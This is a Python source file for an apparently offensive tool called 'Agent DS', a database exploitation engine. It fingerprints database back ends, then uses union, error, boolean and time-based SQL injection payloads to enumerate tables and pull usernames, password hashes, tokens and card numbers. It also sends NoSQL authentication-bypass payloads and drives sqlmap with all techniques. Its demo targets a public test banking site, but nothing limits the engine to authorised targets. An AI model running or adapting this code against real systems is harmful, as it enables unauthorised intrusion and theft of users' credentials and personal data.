#!/usr/bin/env python3
"""
Agent DS - Database Exploitation Engine
Advanced database attack and exploitation capabilities

This module handles comprehensive database exploitation including:
- Database fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, MongoDB, etc.)
- Data extraction and enumeration
- Privilege escalation
- Database configuration testing
- SQLMap integration
- NoSQL database exploitation

Author: Agent DS Team
Version: 2.0
Date: September 16, 2025
"""

import asyncio
import json
import re
import time
import hashlib
import base64
from typing import Dict, List, Set, Optional, Any, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, quote
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import subprocess
import tempfile
import os
import concurrent.futures

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class DatabaseExploitEngine:
    """
    Advanced database exploitation engine with comprehensive attack capabilities
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Database fingerprinting patterns
        self.db_fingerprints = {
            'mysql': {
                'error_patterns': [
                    r'mysql_fetch_array\(\)',
                    r'mysql_query\(\)',
                    r'MySQL server version',
                    r'mysql_num_rows\(\)',
                    r'You have an error in your SQL syntax',
                    r'Warning.*mysql_.*',
                    r'valid MySQL result'
                ],
                'version_queries': [
                    'SELECT @@version',
                    'SELECT version()',
                    'SELECT @@version_comment'
                ],
                'system_tables': [
                    'information_schema.tables',
                    'information_schema.columns',
                    'information_schema.schemata',
                    'mysql.user'
                ],
                'data_extraction': [
                    'SELECT schema_name FROM information_schema.schemata',
                    'SELECT table_name FROM information_schema.tables WHERE table_schema=database()',
                    'SELECT column_name FROM information_schema.columns WHERE table_name=\'{}\'',
                    'SELECT user,password FROM mysql.user'
                ]
            },
            'postgresql': {
                'error_patterns': [
                    r'PostgreSQL.*ERROR',
                    r'Warning.*\Wpg_.*',
                    r'valid PostgreSQL result',
                    r'Npgsql\.',
                    r'PG::SyntaxError:',
                    r'org\.postgresql\.util\.PSQLException',
                    r'ERROR:\s\ssyntax error at or near'
                ],
                'version_queries': [
                    'SELECT version()',
                    'SELECT current_setting(\'server_version\')'
                ],
                'system_tables': [
                    'information_schema.tables',
                    'information_schema.columns',
                    'pg_tables',
                    'pg_user'
                ],
                'data_extraction': [
                    'SELECT schemaname FROM pg_tables',
                    'SELECT tablename FROM pg_tables WHERE schemaname=\'public\'',
                    'SELECT column_name FROM information_schema.columns WHERE table_name=\'{}\'',
                    'SELECT usename FROM pg_user'
                ]
            },
            'mssql': {
                'error_patterns': [
                    r'Microsoft.*ODBC.*SQL Server',
                    r'OLE DB.*SQL Server',
                    r'\[SQL Server\]',
                    r'\[Microsoft\]\[ODBC SQL Server Driver\]',
                    r'\[SqlException',
                    r'System\.Data\.SqlClient\.SqlException',
                    r'Unclosed quotation mark after the character string'
                ],
                'version_queries': [
                    'SELECT @@version',
                    'SELECT SERVERPROPERTY(\'productversion\')',
                    'SELECT SERVERPROPERTY(\'productlevel\')'
                ],
                'system_tables': [
                    'information_schema.tables',
                    'information_schema.columns',
                    'sys.databases',
                    'sys.tables'
                ],
                'data_extraction': [
                    'SELECT name FROM sys.databases',
                    'SELECT name FROM sys.tables',
                    'SELECT name FROM sys.columns WHERE object_id = OBJECT_ID(\'{}\')',
                    'SELECT name FROM sys.server_principals WHERE type = \'S\''
                ]
            },
            'oracle': {
                'error_patterns': [
                    r'ORA-\d{5}',
                    r'Oracle.*Driver',
                    r'Oracle.*Error',
                    r'oracle\.jdbc\.driver'
                ],
                'version_queries': [
                    'SELECT * FROM v$version',
                    'SELECT banner FROM v$version WHERE ROWNUM=1'
                ],
                'system_tables': [
                    'all_tables',
                    'all_tab_columns',
                    'user_tables',
                    'dba_users'
                ],
                'data_extraction': [
                    'SELECT table_name FROM all_tables',
                    'SELECT column_name FROM all_tab_columns WHERE table_name=\'{}\'',
                    'SELECT username FROM dba_users'
                ]
            },
            'sqlite': {
                'error_patterns': [
                    r'SQLite/JDBCDriver',
                    r'SQLite.Exception',
                    r'System.Data.SQLite.SQLiteException',
                    r'sqlite3.OperationalError'
                ],
                'version_queries': [
                    'SELECT sqlite_version()'
                ],
                'system_tables': [
                    'sqlite_master'
                ],
                'data_extraction': [
                    'SELECT name FROM sqlite_master WHERE type=\'table\'',
                    'PRAGMA table_info({})'
                ]
            },
            'mongodb': {
                'error_patterns': [
                    r'mongodb',
                    r'MongoError',
                    r'MongoException',
                    r'com.mongodb'
                ],
                'injection_payloads': [
                    '{"$ne": null}',
                    '{"$exists": true}',
                    '{"$regex": ".*"}',
                    '{"$where": "1==1"}'
                ]
            }
        }
        
        # SQL injection payloads for data extraction
        self.extraction_payloads = {
            'union_based': [
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "' UNION SELECT version(),2,3--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT schema_name,2,3 FROM information_schema.schemata--",
                "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
                "' UNION SELECT column_name,2,3 FROM information_schema.columns--"
            ],
            'error_based': [
                "' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--",
                "' AND updatexml(1, concat(0x7e, (SELECT version()), 0x7e), 1)--",
                "' AND exp(~(SELECT * FROM (SELECT version())a))--"
            ],
            'boolean_based': [
                "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT LENGTH(database()))>0--",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--"
            ],
            'time_based': [
                "' AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND pg_sleep(5)--"
            ]
        }
    
    async def fingerprint_database(self, target_url: str) -> Dict[str, Any]:
        """
        Comprehensive database fingerprinting
        """
        results = {
            'database_type': None,
            'version': None,
            'fingerprint_confidence': 0,
            'error_patterns': [],
            'response_patterns': [],
            'injection_points': []
        }
        
        # Extract test points
        test_points = await self._extract_test_points(target_url)
        
        for test_point in test_points:
            url = test_point['url']
            method = test_point['method']
            params = test_point['params']
            
            for param_name in params.keys():
                # Test each database type
                for db_type, fingerprint_data in self.db_fingerprints.items():
                    if db_type == 'mongodb':
                        continue  # Handle NoSQL separately
                    
                    fp_result = await self._fingerprint_database_type(
                        url, method, params, param_name, db_type, fingerprint_data
                    )
                    
                    if fp_result['confidence'] > results['fingerprint_confidence']:
                        results.update(fp_result)
                        results['database_type'] = db_type
        
        return results
    
    async def _fingerprint_database_type(self, url: str, method: str, params: Dict, 
                                       param_name: str, db_type: str, 
                                       fingerprint_data: Dict) -> Dict[str, Any]:
        """Fingerprint a specific database type"""
        result = {
            'confidence': 0,
            'version': None,
            'error_patterns': [],
            'response_patterns': []
        }
        
        # Test error-based fingerprinting
        error_payloads = [
            "' OR 1=1--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",  # MSSQL
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--",  # MySQL
            "' AND 1=CAST(version() AS int)--",  # PostgreSQL
            "' UNION SELECT version() FROM dual--"  # Oracle
        ]
        
        for payload in error_payloads:
            test_params = params.copy()
            test_params[param_name] = params[param_name] + payload
            
            try:
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=10)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=10)
                    )
                
                response_text = response.text
                
                # Check for error patterns
                for pattern in fingerprint_data['error_patterns']:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        result['confidence'] += 20
                        result['error_patterns'].append(pattern)
                        
                        # Try to extract version information
                        version_match = self._extract_version(response_text, db_type)
                        if version_match:
                            result['version'] = version_match
                            result['confidence'] += 30
                        
                        break
                
            except Exception:
                continue
        
        # Test version queries if injection is possible
        if result['confidence'] > 0:
            for version_query in fingerprint_data.get('version_queries', []):
                version_payload = f"' UNION SELECT ({version_query}),2,3--"
                test_params = params.copy()
                test_params[param_name] = version_payload
                
                try:
                    if method.upper() == 'GET':
                        response = await asyncio.get_event_loop().run_in_executor(
                            None,
                            lambda: self.session.get(url, params=test_params, timeout=10)
                        )
                    else:
                        response = await asyncio.get_event_loop().run_in_executor(
                            None,
                            lambda: self.session.post(url, data=test_params, timeout=10)
                        )
                    
                    version_match = self._extract_version(response.text, db_type)
                    if version_match:
                        result['version'] = version_match
                        result['confidence'] += 25
                        break
                
                except Exception:
                    continue
        
        return result
    
    def _extract_version(self, response_text: str, db_type: str) -> Optional[str]:
        """Extract database version from response"""
        version_patterns = {
            'mysql': [
                r'MySQL server version for the right syntax to use near.*?(\d+\.\d+\.\d+)',
                r'MySQL.*?(\d+\.\d+\.\d+)',
                r'mysql.*?(\d+\.\d+\.\d+)',
                r'(\d+\.\d+\.\d+)-.*?mysql'
            ],
            'postgresql': [
                r'PostgreSQL.*?(\d+\.\d+\.\d+)',
                r'postgres.*?(\d+\.\d+)',
                r'PostgreSQL (\d+\.\d+)'
            ],
            'mssql': [
                r'Microsoft SQL Server.*?(\d+\.\d+\.\d+)',
                r'SQL Server.*?(\d+\.\d+)',
                r'\(SQL Server (\d+)\)'
            ],
            'oracle': [
                r'Oracle Database.*?(\d+c?)',
                r'Oracle.*?Release (\d+\.\d+\.\d+)',
                r'ORACLE.*?(\d+\.\d+)'
            ],
            'sqlite': [
                r'SQLite.*?(\d+\.\d+\.\d+)',
                r'sqlite_version.*?(\d+\.\d+\.\d+)'
            ]
        }
        
        if db_type in version_patterns:
            for pattern in version_patterns[db_type]:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return match.group(1)
        
        return None
    
    async def enumerate_tables(self, target_url: str, db_type: str = None) -> List[Dict[str, Any]]:
        """
        Enumerate database tables
        """
        tables = []
        
        if not db_type:
            # Try to fingerprint first
            fingerprint_result = await self.fingerprint_database(target_url)
            db_type = fingerprint_result.get('database_type')
        
        if not db_type:
            return tables
        
        # Extract test points
        test_points = await self._extract_test_points(target_url)
        
        for test_point in test_points:
            url = test_point['url']
            method = test_point['method']
            params = test_point['params']
            
            for param_name in params.keys():
                tables_result = await self._enumerate_tables_for_param(
                    url, method, params, param_name, db_type
                )
                tables.extend(tables_result)
        
        # Remove duplicates
        unique_tables = []
        seen_tables = set()
        for table in tables:
            table_name = table.get('name', '')
            if table_name and table_name not in seen_tables:
                unique_tables.append(table)
                seen_tables.add(table_name)
        
        return unique_tables
    
    async def _enumerate_tables_for_param(self, url: str, method: str, params: Dict, 
                                        param_name: str, db_type: str) -> List[Dict[str, Any]]:
        """Enumerate tables for a specific parameter"""
        tables = []
        
        if db_type not in self.db_fingerprints:
            return tables
        
        fingerprint_data = self.db_fingerprints[db_type]
        
        # Try different enumeration techniques
        enumeration_queries = []
        
        if db_type == 'mysql':
            enumeration_queries = [
                "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--",
                "' UNION SELECT table_name,table_schema,3 FROM information_schema.tables--",
                "' UNION SELECT CONCAT(table_schema,'.',table_name),2,3 FROM information_schema.tables--"
            ]
        elif db_type == 'postgresql':
            enumeration_queries = [
                "' UNION SELECT tablename,schemaname,3 FROM pg_tables--",
                "' UNION SELECT table_name,table_schema,3 FROM information_schema.tables--"
            ]
        elif db_type == 'mssql':
            enumeration_queries = [
                "' UNION SELECT name,2,3 FROM sys.tables--",
                "' UNION SELECT table_name,table_schema,3 FROM information_schema.tables--"
            ]
        elif db_type == 'oracle':
            enumeration_queries = [
                "' UNION SELECT table_name,owner,3 FROM all_tables--",
                "' UNION SELECT table_name,2,3 FROM user_tables--"
            ]
        elif db_type == 'sqlite':
            enumeration_queries = [
                "' UNION SELECT name,type,3 FROM sqlite_master WHERE type='table'--"
            ]
        
        for query in enumeration_queries:
            test_params = params.copy()
            test_params[param_name] = query
            
            try:
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=10)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=10)
                    )
                
                # Extract table names from response
                extracted_tables = self._extract_table_names(response.text, db_type)
                for table_name in extracted_tables:
                    tables.append({
                        'name': table_name,
                        'database_type': db_type,
                        'extraction_method': 'union_based',
                        'url': url,
                        'parameter': param_name
                    })
                
                if extracted_tables:
                    break  # Stop if we found tables
                
            except Exception:
                continue
        
        return tables
    
    def _extract_table_names(self, response_text: str, db_type: str) -> List[str]:
        """Extract table names from response text"""
        table_names = []
        
        # Common table name patterns
        table_patterns = [
            r'\b(users?|user_info|accounts?|members?)\b',
            r'\b(admin|administrators?|staff)\b',
            r'\b(product|products?|items?|catalog)\b',
            r'\b(orders?|transactions?|payments?)\b',
            r'\b(sessions?|auth|authentication)\b',
            r'\b(logs?|audit|history)\b',
            r'\b(config|configuration|settings?)\b',
            r'\b(news|articles?|posts?|blog)\b',
            r'\b(categories?|tags?|types?)\b',
            r'\b(files?|uploads?|media)\b'
        ]
        
        # Try to extract table names from common response patterns
        lines = response_text.split('\n')
        for line in lines:
            line = line.strip()
            
            # Look for table-like strings
            if len(line) > 2 and len(line) < 50:
                # Check if it looks like a table name
                if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', line):
                    table_names.append(line)
                
                # Check against common table patterns
                for pattern in table_patterns:
                    if re.search(pattern, line, re.IGNORECASE):
                        table_names.append(line)
        
        # Remove duplicates and common false positives
        unique_tables = list(set(table_names))
        filtered_tables = []
        
        false_positives = [
            'html', 'http', 'error', 'warning', 'notice', 'debug',
            'select', 'union', 'where', 'from', 'table', 'column'
        ]
        
        for table in unique_tables:
            if table.lower() not in false_positives and len(table) > 2:
                filtered_tables.append(table)
        
        return filtered_tables[:20]  # Return top 20 table names
    
    async def extract_sensitive_data(self, target_url: str, tables: List[str] = None) -> Dict[str, Any]:
        """
        Extract sensitive data from database
        """
        results = {
            'extracted_data': [],
            'sensitive_tables': [],
            'user_data': [],
            'credential_data': [],
            'configuration_data': []
        }
        
        # If no tables provided, try to enumerate them first
        if not tables:
            table_results = await self.enumerate_tables(target_url)
            tables = [t['name'] for t in table_results]
        
        if not tables:
            return results
        
        # Extract test points
        test_points = await self._extract_test_points(target_url)
        
        for test_point in test_points:
            url = test_point['url']
            method = test_point['method']
            params = test_point['params']
            
            for param_name in params.keys():
                # Focus on sensitive tables
                sensitive_tables = [t for t in tables if self._is_sensitive_table(t)]
                
                for table in sensitive_tables:
                    data_result = await self._extract_table_data(
                        url, method, params, param_name, table
                    )
                    
                    if data_result:
                        results['extracted_data'].append(data_result)
                        
                        # Categorize data
                        if self._is_user_table(table):
                            results['user_data'].append(data_result)
                        elif self._is_credential_table(table):
                            results['credential_data'].append(data_result)
                        elif self._is_config_table(table):
                            results['configuration_data'].append(data_result)
                        
                        results['sensitive_tables'].append(table)
        
        return results
    
    def _is_sensitive_table(self, table_name: str) -> bool:
        """Check if table name indicates sensitive data"""
        sensitive_patterns = [
            r'user', r'admin', r'account', r'member', r'staff',
            r'auth', r'login', r'credential', r'password',
            r'config', r'setting', r'secret', r'key',
            r'session', r'token', r'cookie',
            r'payment', r'card', r'billing', r'financial'
        ]
        
        for pattern in sensitive_patterns:
            if re.search(pattern, table_name, re.IGNORECASE):
                return True
        return False
    
    def _is_user_table(self, table_name: str) -> bool:
        """Check if table contains user data"""
        user_patterns = [r'user', r'member', r'account', r'profile', r'customer']
        return any(re.search(pattern, table_name, re.IGNORECASE) for pattern in user_patterns)
    
    def _is_credential_table(self, table_name: str) -> bool:
        """Check if table contains credential data"""
        cred_patterns = [r'auth', r'login', r'credential', r'password', r'admin']
        return any(re.search(pattern, table_name, re.IGNORECASE) for pattern in cred_patterns)
    
    def _is_config_table(self, table_name: str) -> bool:
        """Check if table contains configuration data"""
        config_patterns = [r'config', r'setting', r'option', r'parameter']
        return any(re.search(pattern, table_name, re.IGNORECASE) for pattern in config_patterns)
    
    async def _extract_table_data(self, url: str, method: str, params: Dict, 
                                param_name: str, table_name: str) -> Optional[Dict[str, Any]]:
        """Extract data from a specific table"""
        
        # Common sensitive column names to target
        sensitive_columns = [
            'username', 'user', 'login', 'email', 'mail',
            'password', 'passwd', 'pass', 'hash', 'secret',
            'admin', 'role', 'privilege', 'permission',
            'token', 'key', 'api_key', 'session',
            'credit_card', 'card_number', 'ssn', 'phone'
        ]
        
        # Try to extract column information first
        column_queries = [
            f"' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='{table_name}'--",
            f"' UNION SELECT COLUMN_NAME,DATA_TYPE,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table_name}'--"
        ]
        
        found_columns = []
        
        for query in column_queries:
            test_params = params.copy()
            test_params[param_name] = query
            
            try:
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=10)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=10)
                    )
                
                # Extract column names
                columns = self._extract_column_names(response.text)
                found_columns.extend(columns)
                
                if columns:
                    break
                
            except Exception:
                continue
        
        # If no columns found, try common column names
        if not found_columns:
            found_columns = sensitive_columns[:5]  # Use first 5 common columns
        
        # Now try to extract actual data
        target_columns = [col for col in found_columns if any(
            sens in col.lower() for sens in sensitive_columns
        )]
        
        if not target_columns:
            target_columns = found_columns[:3]  # Take first 3 columns
        
        # Construct data extraction query
        column_list = ','.join(target_columns[:5])  # Limit to 5 columns
        data_query = f"' UNION SELECT {column_list} FROM {table_name} LIMIT 10--"
        
        test_params = params.copy()
        test_params[param_name] = data_query
        
        try:
            if method.upper() == 'GET':
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.get(url, params=test_params, timeout=10)
                )
            else:
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.post(url, data=test_params, timeout=10)
                )
            
            # Extract and analyze data
            extracted_data = self._extract_data_rows(response.text, target_columns)
            
            if extracted_data:
                return {
                    'table_name': table_name,
                    'columns': target_columns,
                    'data': extracted_data,
                    'row_count': len(extracted_data),
                    'extraction_method': 'union_based',
                    'url': url,
                    'parameter': param_name
                }
        
        except Exception:
            pass
        
        return None
    
    def _extract_column_names(self, response_text: str) -> List[str]:
        """Extract column names from response"""
        columns = []
        
        # Look for column-like strings
        lines = response_text.split('\n')
        for line in lines:
            line = line.strip()
            
            # Check if it looks like a column name
            if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', line) and len(line) > 2 and len(line) < 30:
                columns.append(line)
        
        return list(set(columns))[:10]  # Return unique columns, max 10
    
    def _extract_data_rows(self, response_text: str, columns: List[str]) -> List[Dict[str, str]]:
        """Extract data rows from response"""
        rows = []
        
        # Try to find structured data in the response
        lines = response_text.split('\n')
        potential_data = []
        
        for line in lines:
            line = line.strip()
            if line and len(line) > 3 and len(line) < 200:
                # Check if line contains data-like content
                if ':' in line or '|' in line or '\t' in line:
                    potential_data.append(line)
                elif re.match(r'^[a-zA-Z0-9@._-]+$', line):
                    potential_data.append(line)
        
        # Parse potential data into rows
        for i, data_line in enumerate(potential_data[:10]):  # Max 10 rows
            row = {}
            
            # Try different parsing methods
            if '|' in data_line:
                values = data_line.split('|')
            elif '\t' in data_line:
                values = data_line.split('\t')
            elif ':' in data_line and len(columns) == 2:
                values = data_line.split(':', 1)
            else:
                values = [data_line]
            
            # Map values to columns
            for j, value in enumerate(values[:len(columns)]):
                if j < len(columns):
                    row[columns[j]] = value.strip()
            
            if row:
                rows.append(row)
        
        return rows
    
    async def test_sqlmap_integration(self, target_url: str) -> Dict[str, Any]:
        """
        Test SQLMap integration for advanced exploitation
        """
        results = {
            'sqlmap_available': False,
            'successful_exploitation': False,
            'databases_found': [],
            'tables_found': [],
            'data_extracted': [],
            'output_file': None
        }
        
        try:
            # Check if SQLMap is available
            sqlmap_check = await asyncio.create_subprocess_shell(
                "sqlmap --version",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await sqlmap_check.wait()
            
            if sqlmap_check.returncode == 0:
                results['sqlmap_available'] = True
            else:
                return results
            
        except Exception:
            return results
        
        # Create temporary output directory
        temp_dir = tempfile.mkdtemp()
        output_file = os.path.join(temp_dir, 'sqlmap_output.txt')
        
        # Build SQLMap command
        sqlmap_cmd = [
            'sqlmap',
            '-u', f'"{target_url}"',
            '--batch',  # Non-interactive
            '--random-agent',
            '--timeout=30',
            '--retries=2',
            '--level=2',
            '--risk=2',
            '--technique=BEUSTQ',  # All techniques
            '--output-dir', temp_dir
        ]
        
        # Add cookie and header options if needed
        if '?' in target_url or 'POST' in target_url:
            sqlmap_cmd.extend(['--forms', '--crawl=2'])
        
        try:
            # Run SQLMap
            sqlmap_process = await asyncio.create_subprocess_shell(
                ' '.join(sqlmap_cmd),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=temp_dir
            )
            
            # Wait for completion with timeout
            try:
                stdout, stderr = await asyncio.wait_for(
                    sqlmap_process.communicate(), 
                    timeout=300  # 5 minutes
                )
                
                output_text = stdout.decode('utf-8', errors='ignore')
                
                # Parse SQLMap output
                if 'injectable' in output_text.lower():
                    results['successful_exploitation'] = True
                    
                    # Extract databases
                    db_matches = re.findall(r'available databases.*?:\s*(.*)', output_text, re.IGNORECASE | re.DOTALL)
                    if db_matches:
                        databases = [db.strip() for db in db_matches[0].split(',') if db.strip()]
                        results['databases_found'] = databases[:10]  # Limit to 10
                    
                    # Extract tables
                    table_matches = re.findall(r'Database:.*?Tables.*?:(.*?)(?=Database:|$)', output_text, re.IGNORECASE | re.DOTALL)
                    for match in table_matches:
                        tables = [t.strip() for t in match.split(',') if t.strip()]
                        results['tables_found'].extend(tables)
                    
                    results['tables_found'] = list(set(results['tables_found']))[:20]  # Unique, max 20
                
                # Save output file
                with open(output_file, 'w') as f:
                    f.write(output_text)
                results['output_file'] = output_file
                
            except asyncio.TimeoutError:
                sqlmap_process.terminate()
                results['error'] = 'SQLMap execution timeout'
            
        except Exception as e:
            results['error'] = f'SQLMap execution failed: {str(e)}'
        
        return results
    
    async def test_nosql_injection(self, target_url: str) -> Dict[str, Any]:
        """
        Test NoSQL injection (MongoDB, CouchDB, etc.)
        """
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0,
            'authentication_bypass': False,
            'data_extraction': False
        }
        
        # Extract test points
        test_points = await self._extract_test_points(target_url)
        
        nosql_payloads = [
            # MongoDB injection payloads
            '{"$ne": null}',
            '{"$exists": true}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"$or": [{"username": {"$ne": ""}}, {"username": {"$exists": true}}]}',
            '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
            '{"$where": "this.username == this.password"}',
            '{"$where": "Object.keys(this)[0].match(\'.*\')"}',
            
            # URL parameter format
            'username[$ne]=test&password[$ne]=test',
            'login[$regex]=.*',
            'user[$exists]=true',
            'auth[$where]=1==1'
        ]
        
        for test_point in test_points:
            url = test_point['url']
            method = test_point['method']
            params = test_point['params']
            
            for param_name in params.keys():
                for payload in nosql_payloads:
                    results['payloads_tested'] += 1
                    
                    # Test JSON payload
                    if payload.startswith('{'):
                        test_params = params.copy()
                        
                        try:
                            # Try as JSON in POST body
                            if method.upper() == 'POST':
                                response = await asyncio.get_event_loop().run_in_executor(
                                    None,
                                    lambda: self.session.post(
                                        url, 
                                        json={param_name: json.loads(payload)}, 
                                        timeout=10
                                    )
                                )
                            else:
                                test_params[param_name] = payload
                                response = await asyncio.get_event_loop().run_in_executor(
                                    None,
                                    lambda: self.session.get(url, params=test_params, timeout=10)
                                )
                            
                            # Check for successful authentication bypass
                            if self._check_nosql_success(response):
                                results['vulnerable'] = True
                                results['authentication_bypass'] = True
                                results['vulnerabilities'].append({
                                    'type': 'NoSQL Injection - Authentication Bypass',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': url,
                                    'method': method,
                                    'confidence': 'High'
                                })
                            
                        except Exception:
                            continue
                    
                    # Test URL parameter format
                    else:
                        if '&' in payload:
                            # Multiple parameters
                            param_pairs = payload.split('&')
                            test_params = params.copy()
                            
                            for pair in param_pairs:
                                if '=' in pair:
                                    key, value = pair.split('=', 1)
                                    test_params[key] = value
                            
                            try:
                                if method.upper() == 'GET':
                                    response = await asyncio.get_event_loop().run_in_executor(
                                        None,
                                        lambda: self.session.get(url, params=test_params, timeout=10)
                                    )
                                else:
                                    response = await asyncio.get_event_loop().run_in_executor(
                                        None,
                                        lambda: self.session.post(url, data=test_params, timeout=10)
                                    )
                                
                                if self._check_nosql_success(response):
                                    results['vulnerable'] = True
                                    results['authentication_bypass'] = True
                                    results['vulnerabilities'].append({
                                        'type': 'NoSQL Injection - Parameter Pollution',
                                        'parameter': param_name,
                                        'payload': payload,
                                        'url': url,
                                        'method': method,
                                        'confidence': 'Medium'
                                    })
                                
                            except Exception:
                                continue
        
        return results
    
    def _check_nosql_success(self, response) -> bool:
        """Check if NoSQL injection was successful"""
        response_text = response.text.lower()
        
        # Success indicators
        success_indicators = [
            'welcome', 'dashboard', 'profile', 'logout', 'admin',
            'success', 'authenticated', 'authorized', 'logged in',
            'welcome back', 'user panel', 'control panel'
        ]
        
        # Check status code
        if response.status_code in [200, 302, 301]:
            # Check for success indicators in content
            for indicator in success_indicators:
                if indicator in response_text:
                    return True
            
            # Check for redirects to authenticated areas
            if response.status_code in [302, 301]:
                location = response.headers.get('Location', '').lower()
                if any(indicator in location for indicator in ['dashboard', 'admin', 'profile', 'panel']):
                    return True
        
        return False
    
    async def _extract_test_points(self, target_url: str) -> List[Dict[str, Any]]:
        """Extract testable points from target URL"""
        # Reuse the same method from web_attack.py
        # This is a simplified version for database testing
        test_points = []
        
        from urllib.parse import urlparse, parse_qs
        parsed_url = urlparse(target_url)
        
        # Extract GET parameters
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            params = {k: v[0] if isinstance(v, list) and v else '' for k, v in params.items()}
            
            test_points.append({
                'url': f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}",
                'method': 'GET',
                'params': params
            })
        else:
            # Add default test parameters
            test_points.append({
                'url': target_url,
                'method': 'GET',
                'params': {'id': '1', 'user': 'test', 'search': 'test'}
            })
        
        return test_points

# Test function
async def main():
    """Test the database exploitation engine"""
    engine = DatabaseExploitEngine()
    
    target = "https://demo.testfire.net/bank/login.aspx"
    print(f"Testing database exploitation on: {target}")
    
    # Test database fingerprinting
    print("\n--- Database Fingerprinting ---")
    fingerprint_results = await engine.fingerprint_database(target)
    print(f"Database Type: {fingerprint_results.get('database_type')}")
    print(f"Version: {fingerprint_results.get('version')}")
    print(f"Confidence: {fingerprint_results.get('fingerprint_confidence')}")
    
    # Test table enumeration
    print("\n--- Table Enumeration ---")
    tables = await engine.enumerate_tables(target, fingerprint_results.get('database_type'))
    print(f"Found {len(tables)} tables:")
    for table in tables[:5]:
        print(f"  - {table['name']} ({table['database_type']})")
    
    # Test NoSQL injection
    print("\n--- NoSQL Injection Test ---")
    nosql_results = await engine.test_nosql_injection(target)
    print(f"Vulnerable: {nosql_results['vulnerable']}")
    print(f"Payloads tested: {nosql_results['payloads_tested']}")

if __name__ == "__main__":
    asyncio.run(main())